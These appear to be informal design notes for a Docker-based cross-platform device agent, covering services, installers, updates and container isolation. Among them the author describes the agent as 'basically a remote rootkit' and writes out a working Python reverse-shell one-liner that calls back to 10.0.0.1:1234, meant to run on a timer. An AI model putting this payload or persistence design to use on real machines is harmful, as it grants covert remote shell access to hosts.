Software Agent

Must run on Windows and Mac. Not optional

Must set up infrastructure:
    PKI
    A reverse shell
    Basically a remote rootkit

docker-compose on windows and mac?

Windows and Mac scripts to manage the docker system?

Push everything possible into a docker image

How to do rpc?
    Are Docker hostnames visible to other images on the same Docker network? YES!!!!
    Each service gets a hardcoded hostname

How to package?
    Installing docker
    Installing our images and docker-compose
    Host service that monitors the docker images
    Updating the images
    Code signing/certification for each platform

Windows Service:
    http://thepythoncorner.com/dev/how-to-create-a-windows-service-in-python/

Linux Service:
    systemd

Mac Service:

https://docs.docker.com/docker-for-windows/install/
https://docs.docker.com/docker-for-mac/install/

Enable features from an install script in windows?
    https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/enable-or-disable-windows-features-using-dism
    Microsoft-Windows-Subsystem-Linux

Windows Installer:
    "Beginning with Windows Installer 5.0, a package can be authored to secure new accounts, Windows Services, files, folders, and registry keys. The package can specify a security descriptor that denies permissions, specifies inheritance of permissions from a parent resource, or specifies the permissions of a new account. "
    https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-portal

Service depends on Docker service

OnStart:
    Check for updates
    Start docker-compose

OnStop:
    Stop docker-compose

The system specific code should be limited to controlling the docker service and docker-compose

Control the host service from docker? Dangerous because attackers could potentially hack a docker image and then control the host

Reverse shell:
    import socket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("10.0.0.1",1234));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    p=subprocess.call(["/bin/sh","-i"]);

    Need a timer to call it

docker-compose up -d

What are the requirements?
    A way to manage 'apps' 
    A host based API
    A user managment system:
        Sign-in with Google
    A way to send and receive generic updates
    A UUID for the device

How do we contain the agent on the host?
    No app should have direct access to the host
    What interactions will we have with the host?
        Managing the service
        Limited osquery usage

Can we containerize the host services?
    Update transceiver:
        Applying downloaded updates requires us to step out of container and effect the host
    Local API Endpoint:
        Alomst certainly
    Storage System:
        We'll need as direct of access to storage as possible.
        Might not be able to containerize efficiently.

Service that controls docker
Way for transceiver container to tell host to update docker